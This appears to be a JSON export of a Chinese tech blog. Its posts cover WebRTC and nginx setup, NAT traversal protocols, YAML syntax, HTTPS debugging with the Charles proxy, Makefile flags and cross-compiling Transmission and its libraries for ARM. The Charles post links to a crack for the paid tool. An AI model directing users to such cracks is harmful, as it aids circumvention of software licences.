<textarea id=\"messages\" rows=\"5\" cols=\"20\"></textarea><br />\n    <input id=\"text\" type=\"text\" />\n    <input id=\"send\" type=\"button\" value=\"send\" /><br />\n    <video id=\"localVideo\"></video>\n    <div id=\"remoteVideos\"></div>\n</body>\n</html>\n```\n\n\n\nnginx配置:\n\n```nginx\nserver {\n        listen 8080 default_server;\n        listen [::]:8080 default_server;\n\n        root /home/liuwei/web;\n        index index.html;\n}\n```\n\n+ 打开firefox开始测试  http://207.246.80.69:8080, chrome需要https\n\n+ http://simplewebrtc.com/latest-v3.js 可能丢失, 参考https://github.com/andyet/SimpleWebRTC/blob/gh-pages/latest-v3.js\n\n+ 其中url是信令服务器的地址、nickname、roomid根据需要修改\n\n  \n\n  \n\n### 4. 参考资料:\n\n+ https://www.cnblogs.com/yubaolee/p/webrtc.html\n\n+ https://blog.csdn.net/csj6346/article/details/81455663","tags":["webrtc"],"categories":["javascript"]},{"title":"nat穿透,stun,turn,ice介绍","url":"%2Fp%2Ff3e0f5f5.html","content":"\n### 1. NAT网络地址转换:  \n\n资料: https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2\n\n\n\n完全圆锥型NAT( Full Cone NAT )\n\n地址限制圆锥型NAT( Address Restricted Cone NAT )\n\n端口限制圆锥型NAT( Port Restricted Cone NAT ) \n\n对称型NAT( Symmetric NAT)\n\n<!-- more -->\n\n### 2. STUN(Session Traversal Utilities for NAT)\n\n资料: <https://zh.wikipedia.org/wiki/STUN>\n\n\n\nSTUN，NAT会话穿越应用程序 <https://tools.ietf.org/html/rfc5389>）是一种[网络协议](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE)，它允许位于[NAT](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2)（或多重NAT）后的客户端找出自己的公网地址，查出自己位于哪种类型的NAT之后以及NAT为某一个本地端口所绑定的Internet端端口。这些信息被用来在两个同时处于NAT路由器之后的主机之间创建UDP通信。该协议由RFC 5389定义。\n\n四种主要类型中有三种是可以使用的：[完全圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E5%AE%8C%E5%85%A8%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)、[受限圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)和[端口受限圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E7%AB%AF%E5%8F%A3%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)——但大型公司网络中经常采用的对称型NAT（又称为双向NAT）则不能使用。\n\n\n\n### 3. TURN(Traversal Using Relay NAT)\n\n资料:  <https://zh.wikipedia.org/wiki/TURN>\n\n\n\nTURN（ <https://tools.ietf.org/html/rfc5766>），是一种数据传输协议（data-transfer protocol）。允许在TCP或UDP的连在线跨越[NAT](https://zh.wikipedia.org/wiki/NAT)或[防火墙](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)。\n\n\n\n### 4. ICE(Interactive Connectivity Establishment) \n\n资料: https://zh.wikipedia.org/wiki/%E4%BA%92%E5%8B%95%E5%BC%8F%E9%80%A3%E6%8E%A5%E5%BB%BA%E7%AB%8B>\n\n\n\nice是一种综合性的[NAT穿越](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E8%B6%8A)的技术, 是由[IETF](https://zh.wikipedia.org/wiki/IETF)的MMUSIC工作组开发出来的一种framework，可集成各种[NAT穿透](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E9%80%8F)技术，如[STUN](https://zh.wikipedia.org/wiki/STUN)、[TURN](https://zh.wikipedia.org/wiki/TURN)（Traversal Using Relay NAT，中继NAT实现的穿透）、RSIP（Realm Specific IP，特定域IP）等。该framework可以让SIP的客户端利用各种NAT穿透方式打穿远程的[防火墙](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)。\n\n\n\n### 5. 三个协议介绍\n\n资料:  <https://blog.csdn.net/byxdaz/article/details/52786600>  \n","tags":["nat"],"categories":["系统"]},{"title":"YAML语言教程","url":"%2Fp%2Ff2ad59fc.html","content":"\n## YAML介绍\n\nYAML 语言（发音 /ˈjæməl/ ）的设计目标，就是方便人类读写。它实质上是一种通用的数据串行化格式。它的基本语法规则如下。\n\n- 大小写敏感\n- 使用缩进表示层级关系\n- 缩进时不允许使用Tab键，只允许使用空格。\n- 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可\n\n\n\nYAML 支持的数据结构有三种。\n\n- 对象：键值对的集合(map)\n- 数组：一组按次序排列的值(array)\n- 纯量（scalars）：单个的、不可再分的值\n\n<!-- more -->\n\n## YAML 语法\n\n1.  `#` 表示注释，从这个字符一直到行尾，都会被解析器忽略。\n\n\n\n2. `...` 和`---`配合使用，在一个配置文件中代表一个文件的结束：\n\n\n   ```\n---\ntime: 20:03:20\nplayer: Sammy Sosa\naction: strike (miss)\n...\n\n---\ntime: 20:03:47\nplayer: Sammy Sosa\naction: grand slam\n...\n   ```\n\n  相当于在一个yaml文件中连续写了两个yaml配置项。\n\n\n\n#### 对象\n\n对象的一组键值对，使用冒号结构表示。\n\n```javascript\nanimal: pets\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ animal: 'pets' }\n```\n\nYaml 也允许另一种写法，将所有键值对写成一个行内对象。\n\n```javascript\nhash: { name: Steve, foo: bar } \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ hash: { name: 'Steve', foo: 'bar' } }\n```\n\n\n\n较为复杂的对象格式，可以使用问号加一个空格代表一个复杂的key，配合一个冒号加一个空格代表一个value：\n\n```\n?  \n    - complexkey1\n    - complexkey2\n:\n    - complexvalue1\n    - complexvalue2\n```\n\n意思即对象的属性是一个数组[complexkey1,complexkey2]，对应的值也是一个数组[complexvalue1,complexvalue2]\n\n\n\n#### 数组\n\n一组连词线开头的行，构成一个数组。\n\n```javascript\n- Cat\n- Dog\n- Goldfish\n```\n\n转为 JavaScript 如下。\n\n```javascript\n[ 'Cat', 'Dog', 'Goldfish' ]\n```\n\n\n\n数据结构的子成员是一个数组，则可以在该项下面缩进一个空格。\n\n```javascript\n-\n - Cat\n - Dog\n - Goldfish\n```\n\n转为 JavaScript 如下。\n\n```javascript\n[ [ 'Cat', 'Dog', 'Goldfish' ] ]\n```\n\n数组也可以采用行内表示法。\n\n```javascript\nanimal: [Cat, Dog]\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ animal: [ 'Cat', 'Dog' ] }\n```\n\n#### 复合结构\n\n对象和数组可以结合使用，形成复合结构。\n\n```javascript\nlanguages:\n - Ruby\n - Perl\n - Python \nwebsites:\n YAML: yaml.org \n Ruby: ruby-lang.org \n Python: python.org \n Perl: use.perl.org \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ languages: [ 'Ruby', 'Perl', 'Python' ],\n  websites: \n   { \n     YAML: 'yaml.org',\n     Ruby: 'ruby-lang.org',\n     Python: 'python.org',\n     Perl: 'use.perl.org' \n   } \n}\n```\n\n#### 纯量\n\n纯量是最基本的、不可再分的值。以下数据类型都属于 JavaScript 的纯量。\n\n- 字符串\n- 布尔值\n- 整数\n- 浮点数\n- Null\n- 时间\n- 日期\n\n数值直接以字面量的形式表示。\n\n```javascript\nnumber: 12.30\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ number: 12.30 }\n```\n\n\n\n布尔值用`true`和`false`表示。\n\n```javascript\nisSet: true\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ isSet: true }\n```\n\n\n\n`null`用`~`表示。\n\n```javascript\nparent: ~ \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ parent: null }\n```\n\n\n\n时间采用 ISO8601 格式。\n\n```javascript\niso8601: 2001-12-14t21:59:43.10-05:00 \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ iso8601: new Date('2001-12-14t21:59:43.10-05:00') }\n```\n\n\n\n日期采用复合 iso8601 格式的年、月、日表示。\n\n```javascript\ndate: 1976-07-31\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ date: new Date('1976-07-31') }\n```\n\n\n\nYAML 允许使用两个感叹号，强制转换数据类型。\n\n```javascript\ne: !!str 123\nf: !!str true\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ e: '123', f: 'true' }\n```\n\n\n\n#### 字符串\n\n字符串是最常见，也是最复杂的一种数据类型。字符串默认不使用引号表示。\n\n```javascript\nstr: 这是一行字符串\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '这是一行字符串' }\n```\n\n\n\n如果字符串之中包含空格或特殊字符，需要放在引号之中。\n\n```javascript\nstr: '内容： 字符串'\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '内容: 字符串' }\n```\n\n\n\n单引号和双引号都可以使用，`双引号不会对特殊字符转义。`\n\n```javascript\ns1: '内容\\n字符串'\ns2: \"内容\\n字符串\"\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ s1: '内容\\\\n字符串', s2: '内容\\n字符串' }\n```\n\n\n\n单引号之中如果还有单引号，必须连续使用两个单引号转义。\n\n```javascript\nstr: 'labor''s day' \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: 'labor\\'s day' }\n```\n\n\n\n字符串可以写成多行，从第二行开始，必须有一个单空格缩进。换行符会被转为空格。\n\n```javascript\nstr: 这是一段\n  多行\n  字符串\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '这是一段 多行 字符串' }\n```\n\n\n\n多行字符串可以使用`|`保留换行符，也可以使用`>`折叠换行。\n\n```javascript\nthis: |\n  Foo\n  Bar\nthat: >\n  Foo\n  Bar\n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n{ this: 'Foo\\nBar\\n', that: 'Foo Bar\\n' }\n```\n\n\n\n`+`表示保留文字块末尾的换行，`-`表示删除字符串末尾的换行。\n\n```javascript\ns1: |\n  Foo\n\ns2: |+\n  Foo\n\n\ns3: |-\n  Foo\n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n{ s1: 'Foo\\n', s2: 'Foo\\n\\n\\n', s3: 'Foo' }\n```\n\n\n\n字符串之中可以插入 HTML 标记。\n\n```javascript\nmessage: |\n\n  <p style=\"color: red\">\n    段落\n  </p>\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ message: '\\n<p style=\"color: red\">\\n  段落\\n</p>\\n' }\n```\n\n\n\n#### 引用\n\n锚点`&`和别名`*`，可以用来引用。\n\n```javascript\ndefaults: &defaults\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  <<: *defaults\n\ntest:\n  database: myapp_test\n  <<: *defaults\n```\n\n等同于下面的代码。\n\n```javascript\ndefaults:\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  adapter:  postgres\n  host:     localhost\n\ntest:\n  database: myapp_test\n  adapter:  postgres\n  host:     localhost\n```\n\n`&`用来建立锚点（`defaults`），`<<`表示合并到当前数据，`*`用来引用锚点。\n\n\n\n下面是另一个例子。\n\n```javascript\n- &showell Steve \n- Clark \n- Brian \n- Oren \n- *showell \n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n[ 'Steve', 'Clark', 'Brian', 'Oren', 'Steve' ]\n```\n\n\n\n## YAML实练\n\nhttp://nodeca.github.io/js-yaml/\n","tags":["yaml"],"categories":["计算机基础"]},{"title":"Charles抓包工具破解使用和Https配置","url":"%2Fp%2F2a640eb1.html","content":"\n\n\n\n### 1. Charles 软件破解\n\nhttps://github.com/8enet/Charles-Crack\n\nhttps://www.zzzmode.com/mytools/charles/\n\n发现一个更好用的抓包软件, 免费\n\nhttps://github.com/ProxymanApp/Proxyman\n\n\n\n### 2. Charles Mac Chrome抓包\n\n需要注意的是，Chrome 和 Firefox 浏览器默认并不使用系统的代理服务器设置，而 Charles 是通过将自己设置成代理服务器来完成封包截取的，所以在默认情况下无法截取 Chrome 和 Firefox 浏览器的网络通讯内容。\n\n1. 访问: chrome://settings/   \n2. 然后下拉到最后的高级，下来在“系统”（倒数第二个）的条目下找到“打开代理设置”，然后双击打开之后，打开之后找到代理的tab点开，点开之后可以看到请选择一个协议进行配置，这个时候找到“网页代理(http)”和“安全网页代理(https)”，进行相应的配置就可以了，一般来说自己不做其他处理，直接配置代理服务器为“127.0.0.1”，端口(就是冒号:)后是“8888”。\n3. 如何抓https网站, 在charles左侧该网址右键 Enable SSL Proxying\n\n<!-- more -->\n\n### 3. Charles 手机 Https抓包\n\n##### 1. 安装电脑端证书  在`Help`菜单下的路径,下载根证书,并且在`钥匙串`里设置信任此证书.\n\n![1](Charles抓包工具破解使用和Https配置/1.png)\n![2](Charles抓包工具破解使用和Https配置/2.png)\n\n\n\n##### 2. 安装手机证书\n\n![3](Charles抓包工具破解使用和Https配置/3.png)\n\n\n在相关的手机中打开`Safari`,输入下图中默认的地址`chls.pro/ssl`，手机会自动跳转到证书下载界面，按照提示安装即可.\n\n安装后,设置信任此证书.\n![4](Charles抓包工具破解使用和Https配置/4.png)\n\n\n\n##### 3. 配置手机Wifi代理和开启Charles SSL Proxy\n\n![5](Charles抓包工具破解使用和Https配置/5.png)\n![6](Charles抓包工具破解使用和Https配置/6.png)\n\n\n\n最新系统多了一道程序:\n\n+ 需要在关于本机->证书信任设置->再次信任一下证书\n\n\n\n### 4. Charles可以抓取https报文的原理\n\n原理就是: **中间人攻击**\n\n> Charles 作为一个中间人来进行 HTTPS 的代理，让我们检测到浏览器和 SSL web 服务端之间的明文通信。\n>  Charles 把自己变成一个中间人来达到这一目的。你的浏览器是收不到服务端证书的，Charles 会用自己的根证书动态签发一张证书，然后 Charles 来接受服务端的证书，你的浏览器接受 Charles 的证书。\n>  …\n>  Charles 仍然通过 SSL 与服务端进行通信，但通信是通过浏览器到 Charles，然后在从 Charles 到服务器。\n\n通俗版SSL协议原理:\n\n- 小明和小王是一对好基友，但是远隔万水千山，只能通过写信来传递消息。俩人每天的信件都是通过邮递员小红来传递的，这俩人每天纸条上明文写着信息，小红也天天看的不亦乐乎，这就是 HTTP。\n- 时间久了，两人发现不行，比如有时候会传递一些不和谐的内容，不希望小红这样的腐女看到；于是小明灵机一动，换成葬爱家族的杀马特火星文来进行通信；小王看后，心领神会。由于转换方式两人都知道，这就是对称加密技术。\n- 然而好景不长，小红勤学苦练，终于练成了火星文十级，又能看懂俩人加密的内容了。俩人必须要更换加密方式，但是更换的加密方式也只能通过小红来传递，所以这个加密的手段很难瞒住小红，这就是 HTTP 的不安全性。\n- 正好小明是一位博学的哲♂学家，他立刻写了封信给小王：把你家储物间箱子的上那把挂锁寄过来！小王看后立刻拿出了那把 82 年的挂锁，把它打开并寄给了小明。这个锁大家都能看到，但只有小王有钥匙，这就是传说中的非对称加密，锁就是公钥，小王的钥匙就是私钥。\n- 小明收到后，仔细研究了那把锁，上面烫着『隔壁老王』四个鎏金大字，正是王家祖传的锁，这就是验证服务端的数字证书。\n   于是小明放心的把新的加密方式写在信中，放到盒子里，然后用锁锁上。由于小红没有钥匙，没法查看盒子里到底写了啥，只能原样送过去。小王收到后，用自己的钥匙打开了锁，获得了新的加密方式。这就完成了 SSL 协议的握手。\n\n利用Charles之后的场景:\n\n- 小红拿到锁以后，先扣着不发，然后掏出了自己的锁寄给小明，这就是 Charles 签发了自己根证书；\n- 小明一看这把锁不是正宗王家的，但是小红家的锁，似乎也可以相信，这就是信任了 Charles 的根证书；\n- 小明把加密方式写进去，然后用小红的锁锁起来了，小红打开之后研究了加密方式，发现两人是在用水星文进行交流，瞬间水星文也达到了十级，然后在换上小王的锁锁上了盒子，还给了小王；\n- 小王毫不知情，之后俩人用水星文进行交流，但内容已经全被小红捕获到了。\n\n\n\n参考链接:\n\n+ https://blog.devtang.com/2015/11/14/charles-introduction/  Charles 从入门到精通\n+ https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html  图解SSL/TLS协议\n+ https://www.laoqingcai.com/https-mitm/ 中间人攻击","tags":["charles"],"categories":["软件"]},{"title":"makefile的选项CFLAGS、CPPFLAGS、LDFLAGS和LIBS的区别","url":"%2Fp%2F271bdf2a.html","content":"\n\n\n先看一个例子:\n\n```shell\nexport CFLAGS=\"-I/root/ARM/opt/include\"\nexport LDFLAGS=\"-L/root/ARM/opt/lib\"\n```\n\n\n\n**CFLAGS**： 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。\n\n**LDFLAGS**：gcc 等编译器会用到的一些优化参数，也可以在里面指定库文件的位置。用法：LDFLAGS=-L/usr/lib -L/path/to/your/lib。每安装一个包都几乎一定的会在安装目录里建立一个lib目录。如果明明安装了某个包，而安装另一个包时，它愣是说找不到，可以抒那个包的lib路径加入的LDFALGS中试一下。\n\n**LIBS**：告诉链接器要链接哪些库文件，如LIBS = -lpthread -liconv\n\n<!-- more -->\n\n### CFLAGS,CXXFLAGS,CPPFLAGS的区别\n\nCFLAGS 表示用于 C 编译器的选项\n\nCXXFLAGS 表示用于 C++ 编译器的选项。\n\nCPPFLAGS 可以 用于 C 和 C++ 两者。\n\n\n\n### LDFLAGS,LIBS的区别\n\nLDFLAGS是选项，LIBS是要链接的库。都是喂给ld的，只不过一个是告诉ld怎么吃，一个是告诉ld要吃什么。\n\n看看如下选项：\n\n```shell\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib\nLIBS = -lmysqlclient -liconv\n```\n\n这就明白了。LDFLAGS告诉链接器从哪里寻找库文件，LIBS告诉链接器要链接哪些库文件。不过使用时链接阶段这两个参数都会加上，所以你即使将这两个的值互换，也没有问题。\n\n\n\n说到这里，进一步说说LDFLAGS指定-L虽然能让链接器找到库进行链接，但是运行时链接器却找不到这个库，如果要让软件运行时库文件的路径也得到扩展，那么我们需要增加这两个库给\"-Wl,R\"\n\n```\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\n```\n\n如 果在执行./configure以前设置环境变量export LDFLAGS=\"-L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\" ，注意设置环境变量等号两边不可以有空格，而且要加上引号哦（shell的用法）。执行configure以后，Makefile将会设置这个选项， 链接时会有这个参数，编译出来的可执行程序的库文件搜索路径就得到扩展了。\n\n\n\n### 参考链接:\n\nhttps://forum.golangbridge.org/t/cflags-ldflags-documentation-somewhere/4520/10","tags":["makefile"],"categories":["系统"]},{"title":"交叉编译arm-transmission-2.94","url":"%2Fp%2F73da9612.html","content":"\n\n\n### 编译平台准备工作:\n\n1. 下载arm-none-linux-gnueabi-gcc\n\n2. 下载transmission-2.94\n\n3. 新建ARM文件夹\n\n4. 解压arm-none-linux-gnueabi-gcc和transmission-2.94到ARM文件夹\n\n5. 设置编译平台环境变量\n\n   ```shell\n   export PATH=\"/root/ARM/external-toolchain/bin:$PATH\"\n   export cross=arm-none-linux-gnueabi-\n   export CC=\"${cross}gcc\"\n   ```\n\n6. 编译的时候一定要注意看log, 是arm-none-linux-gnueabi-gcc编译的才是正确的\n\n<!-- more -->\n\n\n\n### 目标平台开始编译:\n\n#### 1. transmission\n\n```shell\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd_daemon  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/ARM/transmission-2.94/a(绝对路径)\n```\n\n\n\ngit clone下来的需要执行./autogen.sh\n\n```shell\n./autogen.sh --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\" \n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/transmission/a(绝对路径)\n```\n\n\n\n错误1. 出现No package 'libevent' found ->安装libevent\n\n错误2. fatal error: curl/curl.h: No such file or directory -> 安装curl\n\n错误3. rpcimpl.c:16:18: fatal error: zlib.h: No such file or directory ->安装zlib\n\n错误4. fatal error: systemd/sd-daemon.h: No such file or directory ->需要安装systemd, 此处强烈建议使用`--without-systemd_daemon`选项, 否则编译systemd又是一堆依赖\n\n\n\n#### 2. libevent\n\n```shell\nwget https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz\ncd libevent-2.0.21-stable\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=\"/root/ARM/opt/\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n#### 3. libcurl\n\n```shell\nwget https://curl.haxx.se/download/curl-7.61.1.tar.gz\ntar zxvf curl-7.61.1.tar.gz\ncd curl-7.61.1\n./configure --prefix=\"/root/ARM/opt/\" --target=arm-none-linux-gnueabi --host=arm-none-linux-gnueabi --with-zlib=\"/root/ARM/opt\" --with-ssl=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n错误1. configure: error: /root/ARM/opt is a bad --with-ssl prefix! -> 安装openssl\n\n\n\n#### 4. openssl\n\n```shell\nwget https://www.openssl.org/source/openssl-1.1.1.tar.gz\ntar zxvf openssl-1.1.1.tar.gz\ncd openssl-1.1.1\n./Configure linux-generic32 shared  -DL_ENDIAN --prefix=/root/ARM/opt --openssldir=/root/ARM/opt\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" MAKEDEPPROG=\"${cross}gcc\" PROCESSOR=ARM\nmake install\n```\n\n\n\n#### 5. zlib\n\n```shell\nwget http://zlib.net/zlib-1.2.11.tar.gz\ntar zxvf zlib-1.2.11.tar.gz\ncd zlib-1.2.11\n./configure --prefix=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n\n\n### 目标平台执行transmission的环境变量(忽略)\n\n```shell\nexport PATH=/dev/opt/bin:$PATH\nexport LD_LIBRARY_PATH=/dev/opt/lib:$LD_LIBRARY_PATH\nexport CURL_CA_BUNDLE=/mnt/Sync2/ca.crt\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_KEY=/mnt/Sync2/key.pem\nexport STNOUPGRADE=1\n```\n\n\n\n\n\n### TODO: 编译systemd\n\n可以参考 https://wiki.beyondlogic.org/index.php?title=Cross_Compiling_SystemD_for_ARM\n\n#### 1. libkmod\n\n```shell\nwget https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-17.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ \n\nmake \nmake install \n```\n\n#### 2. libffi\n\n```shell\nwget https://sourceware.org/ftp/libffi/libffi-3.2.1.tar.gz\n./configure --prefix=/root/ARM/opt/  CC=arm-none-linux-gnueabi-gcc --host=arm-none-linux-gnueabi   \n\nmake\nmake install\n```\n\n#### 3. pcre\n\n```shell\nwget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.42.tar.gz\n./configure --prefix=/root/ARM/opt/ --host=arm-none-linux-gnueabi   CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\"\n\nmake\nmake install\n```\n\n#### 4. libattr\n\n```shell\nwget https://download-mirror.savannah.gnu.org/releases/attr/attr-2.4.48.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" \nmake install\n```\n\n#### 5. libcap\n\n```shell\nwget https://www.kernel.org/pub/linux/libs/security/linux-privs/libcap2/libcap-2.24.tar.xz \nmake prefix=/root/ARM/opt/  BUILD_CC=gcc  CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\nmake不成功修改文件:\n\n```shell\nvi libcap/cap_file.c\n\n-#ifdef VFS_CAP_U32\n+#if defined (VFS_CAP_U32) && defined (XATTR_NAME_CAPS)\n```\n\n#### 6. glibc(没有成功....)\n\n```shell\nwget http://ftp.gnome.org/pub/gnome/sources/glib/2.52/glib-2.52.3.tar.xz\n\nexport glib_cv_stack_grows=no; \\\nexport glib_cv_uscore=no; \\\nexport ac_cv_func_posix_getpwuid_r=no; \\\nexport ac_cv_func_posix_getgrgid_r=no; \\\nCFLAGS=-I/root/ARM/opt/include \\\nLDFLAGS=-L/root/ARM/opt/lib \\\n\n \n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ --disable-libmount\n```\n\n","tags":["transmission"],"categories":["BitTorrent"]},{"title":"arm交叉编译器的区别","url":"%2Fp%2Fa63b0191.html","content":"\n\n\n## 为什么要用交叉编译器？\n\n交叉编译通俗地讲就是在一种平台上编译出能运行在体系结构不同的另一种平台上的程序，比如在PC平台（X86 CPU）上编译出能运行在以ARM为内核的CPU平台上的程序，编译得到的程序在X86 CPU平台上是不能运行的，必须放到ARM CPU平台上才能运行，虽然两个平台用的都是Linux系统。\n\n交叉编译工具链是一个由编译器、连接器和解释器组成的综合开发环境，交叉编译工具链主要由binutils、gcc和glibc三个部分组成。有时出于减小 libc 库大小的考虑，也可以用别的 c 库来代替 glibc，例如 uClibc、dietlibc 和 newlib。\n\n建立交叉编译工具链是一个相当复杂的过程，如果不想自己经历复杂繁琐的编译过程，网上有一些编译好的可用的交叉编译工具链可以下载，但就以学习为目的来说读者有必要学习自己制作一个交叉编译工具链（目前来看，对于初学者没有太大必要自己交叉编译一个工具链）。\n\n<!-- more -->\n\n## 分类和说明\n\n从授权上，分为免费授权版和付费授权版。\n\n免费版目前有三大主流工具商提供，第一是GNU（提供源码，自行编译制作），第二是 Codesourcery，第三是Linora。\n\n收费版有ARM原厂提供的armcc、IAR提供的编译器等等，因为这些价格都比较昂贵，不适合学习用户使用，所以不做讲述。\n\n\n\n+ arm-none-linux-gnueabi-gcc：是 Codesourcery 公司（目前已经被Mentor收购）基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM（32位）系统中所有环节的代码，包括裸机程序、u-boot、Linux  kernel、filesystem和App应用程序。\n\n+ arm-linux-gnueabihf-gcc：是由 Linaro 公司基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM（32位）系统中所有环节的代码，包括裸机程序、u-boot、Linux kernel、filesystem和App应用程序。\n\n+ aarch64-linux-gnu-gcc：是由 Linaro 公司基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARMv8 64位目标中的裸机程序、u-boot、Linux  kernel、filesystem和App应用程序。\n\n+ arm-none-elf-gcc：是 Codesourcery 公司（目前已经被Mentor收购）基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM MCU（32位）芯片，如ARM7、ARM9、Cortex-M/R芯片程序。\n\n+ arm-none-eabi-gcc：是 GNU 推出的的ARM交叉编译工具。可用于交叉编译ARM MCU（32位）芯片，如ARM7、ARM9、Cortex-M/R芯片程序。\n\n\n\n## 交叉编译器下载\n\n- arm-none-linux-gnueabi-gcc下载：<http://www.veryarm.com/arm-none-linux-gnueabi-gcc>\n- arm-linux-gnueabihf-gcc下载：<http://www.veryarm.com/arm-linux-gnueabihf-gcc>\n- aarch64-linux-gnu-gcc下载：<http://www.veryarm.com/aarch64-linux-gnu-gcc>\n- arm-none-elf-gcc下载：<http://www.veryarm.com/arm-none-elf-gcc>\n- arm-none-eabi-gcc下载：<http://www.veryarm.com/arm-none-eabi-gcc>\n\n 以上地址都是直接从官网转存到百度云盘，仅为方便国内用户下载使用，并非本站制作，请勿用于商业或者非法用途。因为版本多难以选择，所以我们建议您使用该类编译器的最新版本。\n\n\n\n## 命名规则\n\n交叉编译工具链的命名规则为：`arch [-vendor][-os] [-(gnu)eabi]`\n\n- **arch** - 体系架构，如ARM，MIPS\n- **vendor** - 工具链提供商\n- **os** - 目标操作系统\n- **eabi** - 嵌入式应用二进制接口（Embedded Application Binary Interface）\n\n根据对操作系统的支持与否，ARM GCC可分为支持和不支持操作系统，如\n\n- **arm-none-eabi**：这个是没有操作系统的，自然不可能支持那些跟操作系统关系密切的函数，比如fork(2)。他使用的是newlib这个专用于嵌入式系统的C库。\n- **arm-none-linux-eabi**：用于Linux的，使用Glibc\n\n\n\n##  实例\n\n#### 1、arm-none-eabi-gcc\n\n（ARM architecture，no vendor，not target an operating system，complies with the ARM EABI）\n用于编译 ARM 架构的裸机系统（包括 ARM Linux 的 boot、kernel，不适用编译 Linux 应用 Application），一般适合 ARM7、Cortex-M 和 Cortex-R 内核的芯片使用，所以不支持那些跟操作系统关系密切的函数，比如fork(2)，他使用的是 newlib 